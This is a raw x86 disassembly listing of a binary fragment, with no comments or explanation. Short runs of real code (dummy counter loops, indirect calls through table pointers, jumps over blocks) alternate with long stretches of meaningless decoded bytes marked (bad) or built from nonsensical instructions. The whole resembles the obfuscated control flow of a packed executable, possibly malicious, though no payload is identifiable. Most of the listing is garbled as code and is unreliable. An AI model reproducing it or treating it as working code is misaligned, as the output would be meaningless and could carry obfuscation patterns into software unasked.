  407442:	fs xor al,0xe0
  407445:	xor    edx,eax
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x4304d7,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x430449,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x4304cf,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     dl,dh
  40747e:	or     DWORD PTR [ecx],esp
  407480:	pop    eax
  407481:	xor    eax,0x8a7e7ec5
  407486:	jg     0x407506
  407488:	jle    0x4074bd
  40748a:	or     eax,0x846a8dac
  40748f:	xor    al,0xe1
  407491:	dec    ecx
  407492:	call   0x36ff:0x2e14ef99
  407499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40749a:	rol    DWORD PTR [ebp+esi*4+0x1f],0xa1
  40749f:	test   eax,0x2507e14f
  4074a4:	loope  0x4074c7
  4074a6:	mov    ds:0x53fdf902,eax
  4074ab:	xor    BYTE PTR [ebp-0x73],bh
  4074ae:	call   DWORD PTR ds:0xf4752d04
  4074b4:	mov    WORD PTR [ebp+0x160f3cda],es
  4074ba:	sub    edx,DWORD PTR [esi-0x53813584]
  4074c0:	sub    eax,0x1dabe5d5
  4074c5:	cld    
  4074c6:	call   0x434626bc
  4074cb:	jb     0x40748e
  4074cd:	test   DWORD PTR [esi+esi*1-0x16],ebp
  4074d1:	push   ebp
  4074d2:	frstor [ecx]
  4074d4:	jne    0x40752a
  4074d6:	cmp    BYTE PTR [edx-0x69],0xa7
  4074da:	jae    0x40747b
  4074dc:	stos   BYTE PTR es:[edi],al
  4074dd:	mov    bl,BYTE PTR ds:0x23efeda6
  4074e3:	sub    BYTE PTR [ebp-0x51],0x54
  4074e7:	fst    st(5)
  4074e9:	popf   
  4074ea:	aad    0x63
  4074ec:	jns    0x407515
  4074ee:	inc    eax
  4074ef:	xor    BYTE PTR [edx],ah
  4074f1:	test   al,0x2a
  4074f3:	xlat   BYTE PTR ds:[ebx]
  4074f4:	in     al,dx
  4074f5:	and    ch,BYTE PTR ds:0x1bd0ee11
  4074fb:	aad    0xda
  4074fd:	push   ss
  4074fe:	data16 cmp ah,BYTE PTR [edx+0x5]
  407502:	sub    eax,DWORD PTR [esp+edx*4]
  407505:	adc    eax,0xc192d06
  40750a:	sti    
  40750b:	stos   DWORD PTR es:[edi],eax
  40750c:	inc    esp
  40750d:	adc    edi,DWORD PTR [edi-0x60]
  407510:	and    DWORD PTR ds:0x91c5e3,esi
  407516:	scas   eax,DWORD PTR es:[edi]
  407517:	pop    edx
  407518:	pushf  
  407519:	xor    BYTE PTR [edx+0x16e7b1cd],dl
  40751f:	sar    DWORD PTR [esi],1
  407521:	sub    eax,0x9b326f31
  407526:	mov    al,ds:0x15eb939e
  40752b:	mov    bl,BYTE PTR [ebx-0x3a3c3e00]
  407531:	mov    cs,WORD PTR [edx-0x29]
  407534:	jns    0x407523
  407536:	pop    ebp
  407537:	mov    ah,al
  407539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40753a:	cmc    
  40753b:	popf   
  40753c:	pop    esi
  40753d:	je     0x40752c
  40753f:	sub    esi,0xfffffff6
  407542:	mul    BYTE PTR [eax+0x75]
  407545:	jns    0x4074d6
  407547:	mov    edi,0xfab872c1
  40754c:	cmp    DWORD PTR [edi+0x5],edx
  40754f:	aas    
  407550:	stos   BYTE PTR es:[edi],al
  407551:	test   eax,0xed961992
  407556:	scas   eax,DWORD PTR es:[edi]
  407557:	pop    esi
  407558:	xor    BYTE PTR [esi-0x7d],bl
  40755b:	pop    edx
  40755c:	jl     0x4075cf
  40755e:	push   es
  40755f:	pop    ds
  407560:	shr    DWORD PTR [ebx],1
  407562:	mov    eax,ds:0xc341c464
  407567:	fild   QWORD PTR [ecx]
  407569:	mov    dl,0x9
  40756b:	jp     0x407579
  40756d:	out    0x65,al
  40756f:	stc    
  407570:	push   edi
  407571:	sbb    BYTE PTR [ecx+ebx*1-0x35137c73],dl
  407578:	pop    es
  407579:	jmp    0xce68f5f9
  40757e:	jg     0x40753c
  407580:	cmp    DWORD PTR [edx+0x79a0e689],esi
  407586:	(bad)  
  407587:	fadd   DWORD PTR [edi+eax*4-0x625cfae1]
  40758e:	xor    cl,BYTE PTR [ecx+edx*8-0x22]
  407592:	aad    0x34
  407594:	cmp    BYTE PTR [ebx-0x2a],bl
  407597:	bound  esp,QWORD PTR [ebp-0xfa4db89]
  40759d:	sbb    ecx,DWORD PTR [edx-0x9]
  4075a0:	dec    esp
  4075a1:	popf   
  4075a2:	leave  
  4075a3:	sti    
  4075a4:	and    ebp,eax
  4075a6:	adc    cl,BYTE PTR [esi+0x2a]
  4075a9:	std    
  4075aa:	stos   DWORD PTR es:[edi],eax
  4075ab:	sbb    eax,0x3b5faa86
  4075b0:	je     0x4075f2
  4075b2:	bound  edi,QWORD PTR [edx]
  4075b4:	xor    eax,0x9d990c49
  4075b9:	outs   dx,BYTE PTR ds:[esi]
  4075ba:	fcom   QWORD PTR ss:[edi-0x1d]
  4075be:	lods   eax,DWORD PTR ds:[esi]
  4075bf:	xchg   ecx,eax
  4075c0:	ins    BYTE PTR es:[edi],dx
  4075c1:	xchg   ecx,eax
  4075c2:	dec    edi
  4075c3:	mov    eax,ds:0x6d4d0119
  4075c8:	add    al,al
  4075ca:	jns    0x4075e7
  4075cc:	imul   esp,DWORD PTR [ebp+0x37],0xffffffc9
  4075d0:	inc    ebp
  4075d1:	sbb    al,0x4f
  4075d3:	mov    eax,0x796389a
  4075d8:	mov    edx,0xfd34f8b
  4075dd:	(bad)  
  4075de:	in     al,dx
  4075df:	lods   eax,DWORD PTR ds:[esi]
  4075e0:	adc    al,0xca
  4075e2:	xchg   esp,eax
  4075e3:	pop    esp
  4075e4:	mov    ebp,0x1f332ef3
  4075e9:	int    0xbf
  4075eb:	ja     0x4075fe
  4075ed:	lock (bad) 
  4075ef:	jmp    0x1c22:0x9971c2c6
  4075f6:	mov    cl,0x9e
  4075f8:	sbb    BYTE PTR [ebp+ebp*8-0x1786005],dl
  4075ff:	test   eax,0xb329fd2f
  407604:	xor    bl,BYTE PTR [edx]
  407606:	popf   
  407607:	fidivr WORD PTR gs:[eax-0x6ae2a305]
  40760e:	aaa    
  40760f:	popf   
  407610:	mov    al,ds:0xe9951466
  407615:	ror    BYTE PTR [eax+esi*8],1
  407618:	xor    bl,BYTE PTR ds:0xf7b758f
  40761e:	test   bl,ch
  407620:	sbb    al,BYTE PTR [eax]
  407622:	add    BYTE PTR [ebx-0x17],dl
  407625:	pop    esi
  407626:	pop    ss
  407627:	add    BYTE PTR [eax],al
  407629:	and    DWORD PTR ds:0x42edcb,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42edcb
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42edcb,edx
  407647:	cmp    DWORD PTR ds:0x42edcb,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42edcb,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42eab3
  40766a:	cmp    DWORD PTR ds:0x42edcb,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42edcb
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42edcb,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	sub    al,0xef
  4076a6:	in     eax,0xa
  4076a8:	inc    ecx
  4076a9:	ret    0x7e7e
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x40769c
  4076b1:	xchg   esp,eax
  4076b2:	(bad)
  4076b5:	outs   dx,BYTE PTR ds:[esi]
  4076b6:	pop    eax
  4076b7:	in     al,dx
  4076b8:	and    DWORD PTR [ecx+0x35967555],esi
  4076be:	dec    esi
  4076bf:	mov    al,ds:0xd68f7085
  4076c4:	neg    DWORD PTR [edi+0x42]
  4076c7:	jp     0x4076e9
  4076c9:	jae    0x407709
  4076cb:	xor    BYTE PTR [ebx],ch
  4076cd:	jecxz  0x4076df
  4076cf:	push   esi
  4076d0:	lods   eax,DWORD PTR ds:[esi]
  4076d1:	ret    0xb279
  4076d4:	push   ds
  4076d5:	fld    DWORD PTR [esi-0x3338027e]
  4076db:	lahf   
  4076dc:	jmp    0x407752
  4076de:	inc    edx
  4076df:	xor    edx,DWORD PTR [esi-0x24acb88c]
  4076e5:	inc    edi
  4076e6:	lock je 0x407696
  4076e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076ea:	and    BYTE PTR [esi+0x5f],ch
  4076ed:	in     eax,0xe7
  4076ef:	jp     0x40776c
  4076f1:	pushf  
  4076f2:	or     al,0xe1
  4076f4:	xor    eax,0x84ab9680
  4076f9:	imul   edi,DWORD PTR [eax-0x2b3e1c9a],0x12268c9e
  407703:	fiadd  DWORD PTR [edi+0x5]
  407706:	sbb    eax,0x49a5eaf5
  40770b:	pop    ss
  40770c:	stos   BYTE PTR es:[edi],al
  40770d:	dec    edi
  40770e:	aas    
  40770f:	mov    DWORD PTR [ebx],esi
  407711:	shl    BYTE PTR [esi],0x6e
  407714:	mov    eax,0x2bd1545f
  407719:	dec    ebp
  40771a:	je     0x407765
  40771c:	inc    ebx
  40771d:	je     0x407797
  40771f:	scas   eax,DWORD PTR es:[edi]
  407720:	stos   DWORD PTR es:[edi],eax
  407721:	aas    
  407722:	ret    
  407723:	sub    ah,BYTE PTR [eax+0x10]
  407726:	mov    ds:0x6e3304c7,eax
  40772b:	xor    eax,0xbe90b6ea
  407730:	mov    BYTE PTR [edx-0x6cd11aa4],ah
  407736:	sbb    bh,BYTE PTR [eax+0x55ade350]
  40773c:	add    DWORD PTR [edi],esp
  40773e:	out    dx,al
  40773f:	retf   0x67af
  407742:	dec    ebx
  407743:	cmp    DWORD PTR [edx+0x5e4a9a6e],ebx
  407749:	cmp    DWORD PTR [eax],ebx
  40774b:	sbb    DWORD PTR [eax],esi
  40774d:	cmc    
  40774e:	mov    ebp,0x127844d5
  407753:	sbb    cl,BYTE PTR [ecx+ecx*1]
  407756:	out    dx,eax
  407757:	push   edi
  407758:	test   BYTE PTR [eax],al
  40775a:	and    eax,0x6b0e6490
  40775f:	mov    al,0x3b
  407761:	imul   esp,DWORD PTR [ebx+0x7af3f173],0x1
  407768:	int    0xfd
  40776a:	sbb    DWORD PTR [edx-0x510fb686],esp
  407770:	pop    ebp
  407771:	sbb    ebx,edi
  407773:	div    dl
  407775:	repz inc BYTE PTR [ebx+0x7416683d]
  40777c:	imul   ecx,DWORD PTR [edx+0x5f8f4a4e],0x43
  407783:	jecxz  0x40771d
  407785:	les    edx,FWORD PTR [eax+0x7a1a7dab]
  40778b:	ret    
  40778c:	ins    BYTE PTR es:[edi],dx
  40778d:	jbe    0x40780d
  40778f:	sbb    BYTE PTR [eax+0x22ed01bf],ch
  407795:	repz mov esi,0x509a392f
  40779b:	sub    edx,DWORD PTR [ebx-0x6b]
  40779e:	inc    esp
  40779f:	lods   eax,DWORD PTR ds:[esi]
  4077a0:	xchg   edi,eax
  4077a1:	and    dl,BYTE PTR [ebp+eax*8+0x1b]
  4077a5:	sbb    edx,DWORD PTR [ecx+0x5f0a5ca2]
  4077ab:	call   0xdc95:0xd6e585b9
  4077b2:	mov    edx,0x2ff84d63
  4077b7:	jp     0x407806
  4077b9:	fwait
  4077ba:	loope  0x4077f4
  4077bc:	jbe    0x4077f4
  4077be:	xchg   esp,eax
  4077bf:	shl    BYTE PTR [ebx],0xb7
  4077c2:	jmp    0x5a802a41
  4077c7:	outs   dx,DWORD PTR ds:[esi]
  4077c8:	pop    edi
  4077c9:	stc    
  4077ca:	mov    WORD PTR [ebp+0x4ebaf95f],fs
  4077d0:	jae    0x4077ee
  4077d2:	stc    
  4077d3:	fmul   DWORD PTR [ebp+0x7f2ef7af]
  4077d9:	(bad)  [edx+0x733e91aa]
  4077df:	cmp    BYTE PTR [edx+0x39],bl
  4077e2:	retf   
  4077e3:	sahf   
  4077e4:	push   es
  4077e5:	xchg   DWORD PTR [esi+0x33ec79e5],edx
  4077eb:	add    ah,BYTE PTR [edi+0x316903e0]
  4077f1:	sbb    al,0x87
  4077f3:	dec    ebp
  4077f4:	ror    DWORD PTR [ecx-0x51],1
  4077f7:	(bad)  
  4077f8:	mov    esp,0x447570f7
  4077fd:	call   0x136c:0x781acf9f
  407804:	adc    ebx,0xffffffc1
  407807:	test   al,0xc9
  407809:	mov    dl,0x5e
  40780b:	mov    bl,0x67
  40780d:	stc    
  40780e:	loope  0x40781b
  407810:	mov    eax,ds:0x88825e1
  407815:	and    al,0xff
  407817:	imul   esp,esi,0x5f
  40781a:	pop    es
  40781b:	xor    BYTE PTR [ebp+0x4e96b51c],dh
  407821:	(bad)  
  407822:	sub    DWORD PTR fs:[edi-0x1f],edi
  407826:	xchg   esp,eax
  407827:	out    dx,al
  407828:	pop    ds
  407829:	inc    edx
  40782a:	rcl    BYTE PTR [ebx+0x41ad83e4],0x65
  407831:	imul   edi,DWORD PTR [edi+esi*8-0x79],0x5534b458
  407839:	mov    ecx,DWORD PTR [esi]
  40783b:	sub    DWORD PTR [edx-0x7c],ecx
  40783e:	pop    eax
  40783f:	loope  0x407886
  407841:	or     edx,esp
  407843:	retf   
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x430449,0x4304cf
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x43046d,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e7c4,0x1e
  407871:	cmp    DWORD PTR ds:0x42e7c4,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e7c4,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42eab7
  407896:	mov    edi,DWORD PTR ds:0x42e7c4
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e7c4,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42edcf
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x43043d,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x43043d
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x43043d,ebx
  4078d6:	cmp    DWORD PTR ds:0x43043d,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42ec27
  4078f1:	cmp    DWORD PTR ds:0x43043d,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	push   DWORD PTR [edx-0x229836b7]
  407947:	sar    BYTE PTR [esi+0x7e],0x8a
  40794b:	jg     0x4079cb
  40794d:	jle    0x4079c1
  40794f:	xchg   bl,cl
  407951:	push   ebx
  407952:	jecxz  0x4079b2
  407954:	out    dx,eax
  407955:	push   ebp
  407956:	out    0x8e,al
  407958:	sbb    eax,0x7c0291e8
  40795d:	fs inc ecx
  40795f:	jp     0x40795f
  407961:	loop   0x407907
  407963:	or     eax,0x63739fd4
  407968:	test   BYTE PTR [esi-0x1b],dh
  40796b:	(bad)  
  40796c:	fdiv   QWORD PTR [esi+0x3aadbcb2]
  407972:	dec    esp
  407973:	sti    
  407974:	jo     0x407965
  407976:	loope  0x40794c
  407978:	fsubr  DWORD PTR [edx-0x1d26e518]
  40797e:	and    DWORD PTR [ebx+0x4e],esi
  407981:	push   esi
  407983:	and    al,0x40
  407986:	jmp    0x490c05ff
  40798b:	or     DWORD PTR [edi+0x4048e698],edx
  407991:	lea    ecx,[edx+0x70]
  407994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407995:	out    0x2b,eax
  407997:	add    al,0x68
  407999:	test   DWORD PTR [eax],0x333d131d
  40799f:	test   DWORD PTR [eax-0x62],0x760f857a
  4079a6:	dec    eax
  4079a7:	jecxz  0x407a15
  4079a9:	push   edx
  4079aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079ab:	test   al,0x21
  4079ad:	outs   dx,BYTE PTR ds:[esi]
  4079ae:	add    BYTE PTR [eax-0x31f195a6],bl
  4079b4:	sbb    edi,esp
  4079b6:	mov    bh,0x38
  4079b8:	out    0x64,eax
  4079ba:	in     eax,dx
  4079bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079bc:	push   ss
  4079bd:	and    DWORD PTR fs:[ebp+0x32a56c33],eax
  4079c4:	adc    BYTE PTR [ebx+0x21],bh
  4079c7:	lds    ecx,FWORD PTR [eax-0x11]
  4079ca:	outs   dx,BYTE PTR ds:[esi]
  4079cb:	push   esi
  4079cc:	adc    eax,0x627172fe
  4079d1:	jo     0x407979
  4079d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079d4:	dec    ecx
  4079d5:	(bad)  
  4079d6:	mov    DWORD PTR [edi+0x4ddabe88],ebp
  4079dc:	mov    esp,0x287b2ff
  4079e1:	ins    DWORD PTR es:[edi],dx
  4079e2:	ds mov ah,0xdb
  4079e5:	sub    DWORD PTR [edx+edx*2-0x16cab3cd],eax
  4079ec:	mov    cl,0xfc
  4079ee:	aam    0xaf
  4079f0:	inc    edi
  4079f1:	ins    BYTE PTR es:[edi],dx
  4079f2:	in     al,0xb2
  4079f4:	out    dx,eax
  4079f5:	push   edx
  4079f6:	js     0x4079c3
  4079f8:	cmp    dl,BYTE PTR [esi+0x16e874f0]
  4079fe:	push   ecx
  4079ff:	mov    BYTE PTR [edi+0x63],al
  407a02:	(bad)  
  407a03:	popa   
  407a04:	inc    ebp
  407a05:	shl    eax,1
  407a07:	dec    edi
  407a08:	ret    0x51f7
  407a0b:	in     al,0x2a
  407a0d:	stos   DWORD PTR es:[edi],eax
  407a0e:	iret   
  407a0f:	mov    eax,ds:0xf1b40da
  407a14:	add    DWORD PTR [ebp+ecx*4+0x60],ecx
  407a18:	sub    bl,al
  407a1a:	out    dx,eax
  407a1b:	sub    dh,ah
  407a1d:	sub    DWORD PTR [edx+eax*2+0x57],ebp
  407a21:	call   0x5a01777b
  407a26:	xor    DWORD PTR [ecx-0x35dba30f],edi
  407a2c:	xor    al,0xad
  407a2e:	inc    edx
  407a2f:	jp     0x4079f3
  407a31:	fadd   DWORD PTR [esp+ecx*1-0x1d]
  407a35:	jecxz  0x407a5e
  407a37:	addr16 stc 
  407a39:	pop    esi
  407a3a:	xchg   ecx,eax
  407a3b:	sbb    eax,0x4441e2e6
  407a40:	jbe    0x407a5f
  407a42:	enter  0x22f2,0x7a
  407a46:	call   0x884f:0x7282e970
  407a4d:	popa   
  407a4e:	inc    edi
  407a4f:	(bad)  
  407a51:	(bad)  
  407a53:	sahf   
  407a54:	xchg   esp,eax
  407a55:	outs   dx,DWORD PTR ds:[esi]
  407a56:	jno    0x4079e6
  407a58:	fldenv [ebp+0x6296db6d]
  407a5e:	push   es
  407a5f:	sbb    al,0x9e
  407a61:	in     al,dx
  407a62:	out    dx,eax
  407a63:	imul   BYTE PTR [edx-0x80]
  407a66:	push   edx
  407a67:	mov    dl,0x70
  407a69:	jno    0x407a4a
  407a6b:	or     eax,0x8a7ae526
  407a70:	or     eax,0xba67fb3a
  407a75:	fs mov ebp,0x10fa7de
  407a7b:	repz or cl,al
  407a7e:	jmp    0xfa62:0xe83fee69
  407a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a86:	rol    edi,cl
  407a88:	imul   edx,DWORD PTR [esi-0x7f8052ef],0x841b5ced
  407a92:	js     0x407ab6
  407a94:	inc    esi
  407a95:	push   esi
  407a96:	(bad)  
  407a97:	adc    eax,DWORD PTR [eax+0x2f]
  407a9a:	adc    bl,BYTE PTR [ebx]
  407a9c:	mov    ah,0xfd
  407a9e:	sub    BYTE PTR [ecx+0x32],0x16
  407aa2:	icebp  
  407aa3:	xor    esi,DWORD PTR [ecx+0x61e3b817]
  407aa9:	adc    eax,0xd15263cc
  407aae:	dec    edi
  407aaf:	adc    BYTE PTR [ecx+0x1b],al
  407ab2:	lods   eax,DWORD PTR ds:[esi]
  407ab3:	std    
  407ab4:	(bad)  
  407ab5:	fmul   DWORD PTR [ecx]
  407ab7:	ret    0x4e77
  407aba:	stos   BYTE PTR es:[edi],al
  407abb:	repz cmc 
  407abd:	mov    ecx,ds
  407abf:	lahf   
  407ac0:	push   edi
  407ac1:	clc    
  407ac2:	xchg   esi,eax
  407ac3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ac4:	cmp    ah,BYTE PTR [ecx-0x3a8b4a1a]
  407aca:	nop
  407acb:	bound  esp,QWORD PTR [edi-0x1fa19d70]
  407ad1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ad2:	iret   
  407ad3:	dec    ecx
  407ad4:	icebp  
  407ad5:	in     eax,dx
  407ad6:	(bad)  
  407ad7:	into   
  407ad8:	data16 mov ah,0xca
  407adb:	mov    ds:0x858b48e6,eax
  407ae0:	or     BYTE PTR [edx],0x8b
  407ae3:	pop    ebp
  407ae4:	lock sub ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi+0x2aea19ca]
  407b11:	repnz imul eax,ecx,0x7f8a7e7e
  407b18:	jle    0x407b98
  407b1a:	dec    eax
  407b1b:	xor    edi,esi
  407b1d:	adc    eax,DWORD PTR [esi+0x57fb168f]
  407b23:	icebp  
  407b24:	and    edi,DWORD PTR [ecx+0x3c]
  407b27:	vsubss xmm0,xmm6,DWORD PTR [ecx-0x2b]
  407b2c:	add    dh,BYTE PTR [edi-0x225aa47f]
  407b32:	fisttp WORD PTR [edi+0x4c]
  407b35:	mov    dl,0xa7
  407b37:	mov    esp,0xd631d4f1
  407b3c:	leave  
  407b3d:	scas   al,BYTE PTR es:[edi]
  407b3e:	ret    
  407b3f:	pop    esi
  407b40:	test   al,0x9c
  407b42:	pop    esi
  407b43:	stos   DWORD PTR es:[edi],eax
  407b44:	mov    dl,0xb9
  407b46:	pop    ebp
  407b47:	mov    WORD PTR [edi-0x5045c470],?
  407b4d:	lods   al,BYTE PTR ds:[esi]
  407b4e:	pop    edi
  407b4f:	xchg   esi,eax
  407b50:	inc    esi
  407b51:	leave  
  407b52:	lahf   
  407b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b54:	push   edi
  407b55:	and    al,0x70
  407b57:	ror    BYTE PTR [esi-0xc],1
  407b5a:	xor    cl,BYTE PTR [ebp+edx*2+0x2265cbcf]
  407b61:	clc    
  407b62:	icebp  
  407b63:	xor    eax,0x5ce79145
  407b68:	popf   
  407b69:	and    bl,BYTE PTR [eax+0x7c]
  407b6c:	pop    eax
  407b6d:	retf   
  407b6e:	ins    BYTE PTR es:[edi],dx
  407b6f:	mov    bh,0x91
  407b71:	and    DWORD PTR [esi+0x7df94e90],esi
  407b77:	inc    edi
  407b78:	xchg   edi,eax
  407b79:	jb     0x407bc5
  407b7b:	leave  
  407b7c:	(bad)  
  407b7d:	lods   eax,DWORD PTR ds:[esi]
  407b7e:	call   0xe0cf:0xe07e83ce
  407b85:	mov    ecx,0xda25be91
  407b8a:	les    esp,FWORD PTR [edi+0x351aa423]
  407b90:	addr16 and eax,0xefc63ce1
  407b96:	int    0x33
  407b98:	xchg   ebp,eax
  407b99:	jmp    0xf13a:0xad1b79bd
  407ba0:	out    dx,al
  407ba1:	add    BYTE PTR [edi],0x51
  407ba4:	sbb    dl,dl
  407ba6:	fucomp st(5)
  407ba8:	in     eax,0xfe
  407baa:	bound  eax,QWORD PTR [eax]
  407bac:	lea    eax,[eax+0x27]
  407baf:	mov    ds:0x47a88acc,al
  407bb4:	dec    ecx
  407bb5:	dec    eax
  407bb6:	xchg   esp,eax
  407bb7:	inc    ebp
  407bb8:	fnstsw ax
  407bba:	sysenter 
  407bbc:	rcl    ch,cl
  407bbe:	add    DWORD PTR [eax+0x4fdfc79d],0x5d775d87
  407bc8:	dec    esp
  407bc9:	adc    edi,DWORD PTR [esp+ecx*1-0xc]
  407bcd:	sub    dh,BYTE PTR [ecx]
  407bcf:	(bad)
  407bd2:	lock cmc 
  407bd4:	and    bh,BYTE PTR [edx+0x1d03e414]
  407bda:	add    eax,0xe6f17605
  407bdf:	sbb    al,0x62
  407be1:	push   ebx
  407be2:	jg     0x407ba0
  407be4:	push   ds
  407be5:	into   
  407be6:	xor    edx,DWORD PTR [ebx+0x11]
  407be9:	or     eax,0x319bc026
  407bee:	icebp  
  407bef:	call   0x5ad9:0x9f169583
  407bf6:	sub    edi,DWORD PTR [ebp+0x44]
  407bf9:	jmp    0xae01:0x5f43b89f
  407c00:	add    DWORD PTR [edi+0x4e],ebx
  407c03:	fldenv ds:0xb2ab
  407c09:	in     al,dx
  407c0a:	xor    al,BYTE PTR [edx-0x30]
  407c0d:	je     0x407c1c
  407c0f:	jg     0x407c1f
  407c11:	pop    esp
  407c12:	mov    eax,0xfb24518a
  407c17:	nop
  407c18:	rol    BYTE PTR [eax+edx*2],cl
  407c1b:	neg    DWORD PTR [esi-0x7]
  407c1e:	adc    edi,eax
  407c20:	ret    0xb551
  407c23:	repz xchg esi,eax
  407c25:	std    
  407c26:	mov    edx,0xd8f3495d
  407c2b:	jb     0x407c8a
  407c2d:	inc    ebx
  407c2e:	or     BYTE PTR ds:0xfa73c049,0x58
  407c35:	dec    edi
  407c36:	cdq    
  407c37:	sti    
  407c38:	or     ecx,eax
  407c3a:	or     al,0x17
  407c3d:	sbb    DWORD PTR [ebx+0x7c],0x1c5d76ea
  407c44:	or     cl,0x71
  407c47:	mov    dl,0x9a
  407c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c4a:	adc    dh,dh
  407c4c:	push   edi
  407c4d:	jg     0x407ccb
  407c4f:	popf   
  407c50:	inc    eax
  407c51:	aam    0x9f
  407c53:	int    0xf7
  407c55:	lahf   
  407c56:	pusha  
  407c57:	cmp    BYTE PTR [eax+0x13],cl
  407c5a:	cmp    ah,bl
  407c5c:	leave  
  407c5d:	pop    ebp
  407c5e:	and    bl,BYTE PTR [eax]
  407c60:	or     bh,BYTE PTR [edx]
  407c62:	cdq    
  407c63:	mov    ch,BYTE PTR [eax]
  407c65:	xchg   ebx,eax
  407c66:	std    
  407c67:	mov    dl,0xa4
  407c69:	push   ss
  407c6a:	aad    0x89
  407c6c:	mov    WORD PTR [eax],ds
  407c6e:	sub    BYTE PTR [edx],0xd5
  407c71:	das    
  407c72:	repz xor BYTE PTR [ebp-0x776340cc],0xa7
  407c7a:	mov    ch,dh
  407c7c:	add    eax,0xcbeff4f8
  407c81:	imul   eax,DWORD PTR [esi+edi*2-0x19],0xd4ea82d
  407c89:	cmp    eax,0xee411e73
  407c8e:	mov    ebp,esp
  407c90:	ret    0x8ed9
  407c93:	pop    ecx
  407c94:	int3   
  407c95:	xor    DWORD PTR [esi-0x5e],esi
  407c98:	into   
  407c99:	jns    0x407c4b
  407c9b:	pusha  
  407c9c:	cmp    dl,BYTE PTR [esi-0x75]
  407c9f:	mov    al,ds:0xf525f8be
  407ca4:	inc    esi
  407ca5:	or     eax,0xd1d2fd85
  407caa:	inc    edi
  407cab:	mov    dh,0x5d
  407cad:	pop    eax
  407cae:	xor    edx,eax
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
